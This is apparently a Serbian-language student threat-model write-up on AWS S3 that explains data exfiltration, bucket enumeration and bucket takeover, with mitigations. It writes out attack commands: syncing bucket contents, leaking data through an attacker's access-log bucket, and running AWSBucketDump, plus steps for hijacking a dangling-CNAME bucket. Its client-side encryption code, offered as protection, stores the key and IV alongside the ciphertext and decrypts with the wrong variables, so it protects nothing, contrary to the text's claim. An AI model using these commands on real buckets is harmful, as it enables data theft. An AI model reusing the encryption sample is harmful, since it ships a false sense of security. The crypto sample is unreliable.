# AWS S3 eksterni servis

Amazon Simple Storage Service (S3) [[1]](#reference) je usluga za skladištenje podataka u oblaku. Dostupan je u različitim AWS regijama širom sveta. Svaka AWS regija je fizički odvojena lokacija sa svojim resursima i infrastrukturom. Korisnici mogu da odaberu AWS regiju u kojoj žele da uspostave svoje skladište podataka. Bucket je osnovna jedinica organizacije podataka koji ima jedinstveno ime unutar AWS regije. Svaki bucket ima objekte, a objekat ima jedinstveni ključ unutar bucket-a. Ključ objekta predstavlja njegovu putanju unutar bucket-a kao i njegov jedinstveni identifikator. Objekat je osnovna jedinica podatka koji se čuva.<br>
Kao i svaki drugi servis tako je i AWS S3 podložan sigurnosnim pretnjama.
1. Neovlašćeni pristup osetljivim podacima [P1] <br>
Ključni resurs koji može biti ugrožen u okviru AWS S3 usluge su bucket-i sa svojim podacima. Napadač može da pregleda podatke unutar bucket-a i na taj način, ugrožava poverljivost informacija. Ovi podaci predstavljaju vredan resurs za napadača koji ih može iskoristiti u cilju zloupotrebe, iznude ili ucene gde napadač traži novac ili nešto drugo kako ih ne bi objavio ili zloupotrebio.
2. Gubitak kontrole nad bucket-om [P2] <br>
Kao i u prethodnoj pretnji, ključni resurs koji je ugrožen jeste bucket sa svojim podacima. Pored ugrožavanja poverljivosti informacija, direktno su ugroženi i integritet i dostupnost podataka smešteni unutar njega. Napadač ima mogućnost da pregleda, menja ili briše podatake, kao i da dodaje zlonamerni sadržaj i na taj način izvodi druge napade kao što je Phishing. Na ovaj način napadač može da nanese štetu organizaciji, zloupotrebi podatke, vrši ucene ili iznude finansijskih sredstava. 

![Stablo napada](https://github.com/vulinana/ZOSS-Projekat/blob/main/ModulPoslovanja/AWS-S3/Dijagrami/aws-s3-attack-tree.png)

## Napadi

### Data Exfiltration [N1]

Data exiltration [[2]](#reference), poznat kao i data extrustion, predstavlja neovlašćeni prenos ili krađu podataka koji su smešteni u S3 bucket-ovima od strane napadača. Napadač pokušava dobiti pristup osetljivim podacima koje se nalaze u bucket-ovima, pa ih preneti ili zloupotrebiti.

Napadač prvo identifikuje AWS S3 bucket koji će mu potencijalno biti cilj napada. To može učiniti koristeći različite komande kao što je Google dorks za pronalaženje S3 bucket-a koji su povezani sa određenim sajtom (komanda: site:s3.amazonaws.com <site.com>). Ovo je pretraga koja se vrši putem Google pretraživača kako bi se identifikovali potencijalni ciljni bucket-i. Drugi način bi bilo korišćenje CLI alatki za enumeraciju bucket-a kao što su Slurp, Bucket_finder, S3Scanner i Cloudlist ili skripti kao što je AWSBucketDump. Ove alatke pomažu u identifikaciji dostupnih bucket-a, pristupajući informacijama o njihovim konfiguracijama i sadržaju.

Nakon pronalska potencijalnih ciljnih bucket-a sledi analiza bezbednosnih mera kako bi se identifikovale ranjivosti kao i procena da li su podaci unutar njih vredni. Da bi se proverila konfiguracija amazon S3 bucket-a potrebno je instalirati AWSCLI. Bitno je napomenuti da AWSCLI mora biti konfigurisan dodavanjem podataka o AWS nalogu, odnosno klijentskom ID-u i tajnom ključu. Nakon toga moguće je proveriti da li postoje konfiguracije koje mogu dovesti do izvršavanja napada. Kako bi se videle dozvole koristi se sledeća komanda:
 ```
     aws s3api get-bucket-acl --bucket <bucket-name> --output json
 ```
Nakon analize rezultata koji je dobijen ovom komandom, napadač postaje svestan da može pristupiti podacima unutar bucket-a. Kako bi to uradio koristi sledeću komandu koja će izlistati sve datoteke i direktorijume u datom bucket-u:
 ```
    aws s3 ls s3://<bucket-name>
 ```
Napadač takođe ima mogućnost da preuzme sve podatke koji se nalaze na datom bucket-u i smesti ih na svoju željenu lokaciju pomoću sledeće komande:
 ```
    aws s3 sync s3://<bucket>/<path> </local/path>
 ```
Nakon ovih koraka napad je izvršen i napadač može da iskoristi podatke u skladu sa svojim ciljevima. Na ovaj način Data Exfiltration ostvaruje pretnju 'Neovlašćeni pristup osetljivim podacima' [P1]. Napadač može da proda osetljive informacije na crnom tržištu, da vrši iznudu ili ucenu onoga kome je podatke ukrao.

Još jedan konkretan scenario Data Exfiltration napada bi se mogao prikazati ako napadač ima kontrolu nad S3 bucket-om koji se koristi za čuvanje server access logova [[3]](#reference). Napadač aktivira server access logove na ciljnom S3 bucket-u nad kojim želi izvršiti napad data exfilitration. Sa server access logging-om svaki zahtev ka bucket-u će biti zabeležen u bucket-u za logovanje. Ovo uključuje interne AWS zahteve ili zahteve izvršene putem AWS konzole. Čak i ako je zahtev odbijen, payload koji zahtev nosi će biti poslat ka napadačevom logging bucket-u. Napadač može slati GetObject zahteve ka S3 bucket-ovima do kojih nema pristup:
 ```
    aws s3api get-object --bucket AttackerBucket --key ExampleDataToExfiltrate
 ```
Međutim, zato što kontroliše server access logove, i dalje će primati podatke kojima inače nema pristup:
 ```
    [..] attackerbucket […] 8.8.8.8 – […] REST.GET.OBJECT ExampleDataToExfiltrate "GET /
    ExampleDataToExfiltrate HTTP/1.1" 403 AccessDenied 243 - 18 - "-" "UserAgentAlsoHasData " – […]
 ```
Na osnovu informacija iz logova napadač može rekonstruisati podatke koje je pokušao eksfiltrirati. Problem koji se javlja jeste taj što logovi koji zabeleže svaki zahtev ka bucket-u nisu nužno uređeni po vremenu dolaska. To znači da ako napadač podatke razbije na više zahteva, može se suočiti sa situacijom gde logovi stižu u nekom drugačijem redosledu. Ako pokušava da rekonstruiše podatke koji su razbijeni na više zahteva, napadač će prvo morati razviti mehanizam koji će pravilno sortirati te logove kako bi ispravno sastavio originalne podatke.

#### Mitigacije [[4]](#reference)

1. Konfiguracija pristupa [M1] <br>
Kada je konfiguracija pristupa u pitanju, potrebno je odrediti ko ima pristup kojim podacima i na koji način. Ovo podrazumeva razna podešavanja kao sto su postavljanje Identity and Access Managment - IAM politika, Bucket-Level politika, postavljanje S3 Bucket Access Control Lists - ACL-ova [[5]](#reference).<br><br>
**IAM politike** - određuju koje su radnje dozvoljene ili odbijene na AWS uslugama/resursima za određenog korisnika. IAM politike možemo da dodelimo          specifičnom korisniku, ulozi ili grupi.<br><br>
**Bucket-Level politike** - određuju koje su radnje dozvoljene ili nisu nad specifičnim bucket-om za određene korisnike. <br><br>
**S3 Bucket ACL** - predstavlja stari način upravljanja pristupom bucket-ima. AWS preporučuje korišćenje IAM ili Bucket-Level politika, ali još uvek postoje slučajevi u kojima ACL-ovi daju veću fleksibilnost od politika. To je jedan od razloga zašto još uvek nisu zastareli niti će biti uskoro. Najznačajnija prednost jeste što se mogu dodeljivati i bucket-ima ali i samim objektima, što nije slučaj sa politikama. Znači da postoji velika fleksibilnost nad resursima jer neki objekti mogu biti javni u privatnom bucket-u kao i obrnuto. <br><br>
Najbolja praksa, bez obzira koje se od ova tri podešavanja koristi, predstavlja primenu dozvola sa najmanjim privilegijama, što znači da korisnici dobijaju samo dozvole koje su im neophodne za obavljanje sopstvenih zadataka. Time se smanjuje površina napada.<br>
Kada je u pitanju Data Exfiltration najviše pažnje treba posvetiti dozvolama za čitanje podataka (READ).
<br><br>
3. Enkripcija podataka [M2] <br>
Enkripcijom podaci postaju beskorisni napadaču jer ne može da ih pročita. Postoji nekoliko načina kako se može odraditi enkripcija kada je u pitanju AWS S3. <br><br>
**Šifrovanje na strani servera** - Amazon S3 šifruje objekte pre nego što ih sačuva na diskovima u svojim centrima podataka, a zatim dešifruje objekte kada budu preuzeti. Šifrovanje se vrši uz pomoć ključa koji se ne čuva na istom mestu gde su i podaci. Amazon S3 nudi nekoliko opcija za šifrovanje na strani servera kao što su: šifrovanje pomoću Amazon S3 managed keys (SSE-S3), AWS Key Managment Service keys (SSE-KMS) i dvoslojna server-side enkripcija (DSSE-KMS). <br>

    Enkripcija sa sse-s3 ključem je default-no nameštena, međutim da bi se odradila neophodno je da se u zahtevu za upload datoteke naglasi da se vrši ServerSideEncryption. 

     ```
        const uploadResult = await this.s3
            .upload({
                Bucket: this.bucketName,
                Body: dataBuffer,
                Key: filename,
                ContentDisposition: 'inline',
                ServerSideEncryption: 'AES256' 
            })
            .promise()
     ```
    Međutim, ovaj vid enkripcije u slučaju Data Exfiltration napada nad nepravilno konfigurisanim bucket-om nema neku poentu. Dekripcija datoteka se vrši automatski za svakog ko ima pristup objektima što je u ovom slučaju i sam napadač.

    Prilikom enkripcije SSE-KMS ključem, prvo je neophodno kreirati dati ključ i odrediti koji IAM korisnici i kakve permisije imaju nad njim. Nakon toga se u samom podešavanju bucket-a (Properties) podesi da se vrši enkripcija korišćenjem SSE-KMS i izabere se ključ koji je prethodno kreiran. Ova enkripcija se vrši automatski tako da svaki put kada korisnik koji ima permisiju za enkripciju sa ovim ključem uradi upload datoteke, ona će se enkriptovati, a svaki put kada korisnik koji ima permisiju za dekripciju preuzme datoteku ona će automatski biti dekriptovana. Napadač će moći da izlista sve fajlove korišćenjem komande "aws s3 ls s3://bucket-name". Međutim, svaki korisnik koji pokuša da pristupi enkriptovanoj datoteci, a nema permisije za dekripciju postavljene u ključu korišćenom prilikom enkripcije, dobiće grešku prikazanu na Slici 1.1 <br><br>
![Slika 1.1](https://github.com/vulinana/ZOSS-Projekat/blob/main/ModulPoslovanja/AWS-S3/Slike/error-kms-encrypted.PNG) <br>Slika 1.1<br>

    DSSE-kms enkripcija predstavlja kombinaciju client-side i server-side enkripcije upotrebom kms ključa.

    **Šifrovanje na strani klijenta** - podrazumeva da korisnik pošalje već šifrovane podatke na Amazon S3. U ovom slučaju on upravlja procesom šifrovanja, ključevima za šifrovanje i povezanim alatima. 
U Caddie aplikaciji moguće je korišćenje biblioteke crypto za enkripciju i dekripciju datoteka. Ovo je potrebno implementirati ručno, tako da se svaki put pre upload-a vrši enkripcija, a svaki put nakon download-a vrši dekripcija preuzete datoteke.
    ```
      encryptData(dataBuffer: Buffer): Buffer {
         const cipher = crypto.createCipheriv(this.algorithm, key, iv);
         const encryptedBuffer = Buffer.concat([cipher.update(dataBuffer), cipher.final()]);
         return Buffer.concat([key, iv, encryptedBuffer]);
      }

      decryptData(encryptedBuffer: Buffer): Buffer {
        const receivedKey = encryptedBuffer.slice(0, 32);
        const receivedIV = encryptedBuffer.slice(32, 48);
        const receivedEncryptedBuffer = encryptedBuffer.slice(48);
    
        const decipher = crypto.createDecipheriv(this.algorithm, key, iv);
        const decryptedBuffer = Buffer.concat([decipher.update(receivedEncryptedBuffer), decipher.final()]);
        return decryptedBuffer;
      }
    ```

    Ukoliko sada napadač pokuša da preuzme datoteku, uspeće u tome. Neće dobiti grešku kao što je to slučaj sa enkripcijom na strani AWS-a. Međutim, kada otvori datoteku videće da je ona enkriptovana kao što je prikazano na Slici 1.2. <br><br>
![Slika 1.2](https://github.com/vulinana/ZOSS-Projekat/blob/main/ModulPoslovanja/AWS-S3/Slike/encrypted.PNG) <br>Slika 1.2<br><br>

4. Praćenje i detekcija aktivnosti [M5] <br>
Ukoliko se napad desi veoma je bitno da na vreme bude identifikovan. To se može uraditi korišćenjem alata kao što je AWS CloudTrail koji se koristi za praćenje svih aktivnosti na AWS-u. CloudTrail beleži događaje i aktivnosti vezane za AWS nalog i smešta podatke u CloudTrail log grupe, gde se lako mogu pregledati i analizirati. Iz podataka se može zaključiti zahtev koji je upućen, IP adresa sa koje je zahtev podnet, ko je i kada podneo zahtev, kao i drugi dodatni detalji o samom zahtevu. <br>
Za zaštitu od Data Exfiltration napada bitno je što CloudTrail može pratiti svaki zahtev za prenos podataka između S3 bucket-a i drugih AWS resursa. Sumnjive aktivnosti koje ukazuju na velike prenose podataka ili nepravilne upite mogu biti detektovane i istražene. Naravno, ovo je moguće pod uslovom da napadač ne obriše logove kako bi sakrio tragove napada. 

### Bucket Enumeration <a id="N2">[N2]</a>

Bucket Enumeration  [[6]](#reference) je napad koji podrazumeva otkrivanje postojanja S3 bucket-a i proveru da li su oni javni. Ovaj napad je važan korak za napadače koji planiraju potencijalne napade na podatke koji se nalaze u tim bucket-ima (kao što je Data Exfiltration [N1] ili Bucket Takeover [N3]). Medjutim može biti i deo bezbednosne analize sa ciljem otkrivanja potencijalnih rizika. 

Prvi način na koji napad može da se izvede jeste tako što će se prvo odraditi pasivno istraživanje (PASSIVE RECON), tj identifikacija da li neki veb sajt koristi S3 bucket-e, kao i otkrivanje regije kojoj pripada. Otkrivanje regije nije obavezan korak, ali svakako može olakšati i uštedeti vreme prilikom pogađanja imena bucket-a, jer različite regije imaju različita imena bucket-a. Za ovaj korak se može koristiti nslookup u slučaju da web server koji koristi S3 bucket nije zaštićen WAF-om (Web Application Firewall). Na Slici 2.1 se vidi da je IP adresa locirana u regionu us-west-2. <br><br>
![Slika 2.1](https://github.com/vulinana/ZOSS-Projekat/blob/main/ModulPoslovanja/AWS-S3/Slike/nslookup.PNG) <br>Slika 2.1<br>

Sada kada napadač ima ove informacije, sledeći korak predstavlja aktivno istraživanje (ACTIVE RECON), tj izvršavanje opštih upita i enumeracija imena bucket-a. Napadač bi trebalo da izvrši enumeraciju poddomena, domena i domena najvišeg nivoa kako bi se uverio da ciljni sajt ima S3 bucket. Za pogađanje imena bucket-a, može koristiti rečnik sa često korišćenim imenima ili praveći nasumične kombinacije. Npr ako traži bucket-e koji pripadaju www.geeksforgeeks.com, tada bi trebao probati imena bucket-a poput geeksforgeeks.com ili www.geeksforgeeks.com. Kada uspe da otkrije ime bucket-a, moći če direktno posetiti automatski dodeljeni S3 URL koji daje Amazon, gde će format biti: http://bucketname.s3.amazonaws.com kao što je prikazano na Slici 2.2.<br><br>
![Slika 2.2](https://github.com/vulinana/ZOSS-Projekat/blob/main/ModulPoslovanja/AWS-S3/Slike/bucketname.s3.amazonaws.PNG) <br>Slika 2.2<br>

Još jedan način za izvođenje bucket enumeration-a bi bio upotrebom third-party alata [[7]](#reference). Postoje različiti third-party alati i skripte koje mogu automatizovati proces pronalaženja S3 bucket-a.

AWSBucketDump je primer python skripte koja se koristi za enumeraciju javno dostupnih bucket-a. Moguće ju je skinuti sa sledećeg github repozitorijuma "https://github.com/jordanpotti/AWSBucketDump" i instalirati korišćenjem komande "pip install -r requirements.txt". Enumeracija se vrši uz pomoć sledeće komande:
 ```
     python AWSBucketDump.py -l buckets.txt
 ```
Gde je buckets.txt tekstualna datoteka koja sadrži imena bucket-a gde napadač navodi nazive bucket-a koje želi da proveri da li postoje i da li su javno dostupni. Nakon što se komanda izvrši, rezultati će biti smešteni u interesting_file.txt. 

Nakon što je pronađen javno dostupan bucket, ostvarena je pretnja 'Neovlašćen pristup osetljivim podacima' [P1].

#### Mitigacije

1. Konfiguracija pristupa [M1] <br>
Kao što je detaljnije opisano kod prethodnog napada i ovde je potrebno voditi računa o podešavanjima kao sto su postavljanje Identity and Access Managment - IAM politika, Bucket-Level politika, postavljanje S3 Bucket Access Control Lists - ACL-ova. Bucket će biti podložan ovom napadu kada je Public i iz tog razloga ovo treba izbegavati. Međutim ukoliko postoji potreba da ipak bude javan, bitno je podesiti zaštitu na nivou samih objekata koje želimo da zaštitimo.

2. Upotreba neuobičajenih imena za bucket-e [M3]<br>
Upotrebom neuobičajenih i teško predvidivih imena može se povećati bezbednost i otežati neovlašćenim osobama da ih lako otkriju. Bitno je izbegavati ključne reči, brendove ili informacije o sadržaju prilikom izbora imena. Ako se koriste jasno definisana i predvidljiva imena napadači će ih mnogo lakše i brže identifikovati. Kada se koriste složeni nazivi mnogo je teže generisati takvo ime, a samim tim i pronaći bucket.

3. Enkripcija podataka [M2]<br>
Nakon što su pronadjeni javni bucket-i, napadač može da vidi podatke koji se nalaze u njima te ih je neophodno enkriptovati korišćenjem tehnika koje su opisane u prethodnom napadu.

4. Praćenje i detekcija aktivnosti [M5] <br>
CloudTrail beleži svaki zahtev za pristup bucket-ovima, što omogućava identifikaciju slučajeva gde napadači pokušavaju identifikovati dostupne bucket-ove. Nakon što se napad uoči, ažuriranje bezbednosnih politika i brza reakcija mogu ograničiti potencijalne pretnje.
 
### Bucket takeover [N3]

Bucket takover [[8]](#reference) predstavlja moćan napad koji cilja nepravilno konfigurisane S3 bucket-e. Ovaj napad omogućava napadačima pristup privatnom prostoru za skladištenje koji pripada organizaciji ili pojedincu, pristup podacima unutar njega i preuzimanje potpune kontrole nad bucket-om.

Prvi korak u izvođenju ovog napada predstavlja identifikaciju bucket-e koji će biti meta napada. Budući da ovim bucket-ima nedostaju odgovarajuće sigurnosne mere, to ih čini podložnim otkrivanju od strane napadača pomoću alatki koje se koriste u Bucket Enumeration-u (S3Scanner, S3Finder,..). Kada se adresa potencijalno ranjivog S3 bucket-a poseti pomoću veb pretraživača, pisaće da bucket ne postoji kao što je prikazano na Slici 3.1. To znači da je programer obrisao S3 bucket, ali nije obrisao cname (Canonical Name - tip DNS zapisa). Ova situacija je dovoljna da se zaključi da ranjivost može biti iskorišćena. <br><br>
![Slika 3.1](https://github.com/vulinana/ZOSS-Projekat/blob/main/ModulPoslovanja/AWS-S3/Slike/no-such-bucket.png) <br> Slika3.1 <br>

Da bi napadač preuzeo kontrolu nad adresom s3 bucket-a, prvi korak jeste kreiranje novog bucket-a. Ovo može biti odrađeno bez obzira na vlasništvo. Pretpostavlja se da je ranjivo okruženje "test.s3.amazonaws.com", tako da je za naziv bucket-a potrebno uneti "test". Nakon ovoga napadač može da podesi ostale konfiguracije kako njemu odgovara, kao što su npr javni pristup bucket-u ili da onemogući KMS Encryption opciju koja je podrazumevano omogućena. 
Nakon uspešnog kreiranja bucket-a, biće kreirane različite permisije i politike kako bi se omogućilo dodavanje željenih podataka u bucket. Da bi se to postiglo, prvo je potrebno konfigurisati opciju Static Web Hosting pod sekcijom Properties (u prvom koraku omogućiti Static Web Hosting, a u drugom koraku dodati ime fajla koji će se pojaviti u bucket-u pod index.html). Sledeći korak je dodavanje index.html fajla koji će se prikazivati na veb interfejsu. Napadač će to učiniti tako što će ići na Buckets > "Ime bucket-a" i izabrati obciju Objects. Nakon toga klikom na dugme Upload i izborom fajla ga i dodaje. Poslednji korak je podešavanje politika koje omogućavaju javni pristup objektima u bucket-u.

Ovim koracima napadač je postao vlasnik i stekao potpunu kontrolu nad bucket-om koji je nekada bio u vlasništvu pojedinca/kompanije i ostvario pretnju 'Gubitak kontrole nad bucket-om' [P2].

#### Mitigacije 

1. Konfiguracija pristupa [M1]<br>
Kao i u pretnodna dva napada, konfiguracija pristupa igra ključnu ulogu kada je reč u prevencijama napada. <br><br>
2. Brisanje DNS zapisa [M4]<br>
Ako postoje S3 buvket-i koji su obrisani, a DNS zapisi za taj bucket i dalje postoje, to može predstavljati ozbiljan bezbednosni rizik. Napadač može preuzeti kontrolu nad tim neiskorišćenim DNS zapisima i usmeriti ih ka drugom S3 bucket-u koju kontroliše kao što je opisano. Ovo predstavlja preventivnu bezbednosnu meru koja pomaže u očuvanju sigurnosti i sprečava potencijalne bezbednosne probleme. <br><br>
3. Enkripcija podataka [M2]<br>
Ukoliko je kontrola nad bucket-om već izgubljena dobro bi bilo da su podaci šifrovani, korišćenjem tehnika za šifrovanje koje su prethodno opisane, kako makar ne bi mogao da ih zloupotrebi. <br><br>
4. Praćenje i detekcija aktivnosti [M5] <br>
CloudTrail omogućava praćenje svih događaja i aktivnosti unutar AWS infrastrukture, uključujući promene u konfiguraciji S3 bucket-a. Bilo kakve nepravilnosti ili promene u privilegijama i pravilima pristupa mogu biti brzo identifikovane.

# Reference

[1] https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html 

[2] https://www.shehackske.com/how-to/data-exfiltration-on-cloud-1606/ 

[3] https://hackingthe.cloud/aws/exploitation/s3_server_access_logs/ 

[4] https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html 

[5] https://binaryguy.tech/aws/s3/iam-policies-vs-s3-policies-vs-s3-bucket-acls/ 

[6] https://www.geeksforgeeks.org/s3-bucket-enumeration-and-exploitation/ 

[7] https://medium.com/@aka.0x4C3DD/s3-bucket-enumeration-research-and-insights-674da26c049e 

[8] https://socradar.io/aws-s3-bucket-takeover-vulnerability-risks-consequences-and-detection/ 
   
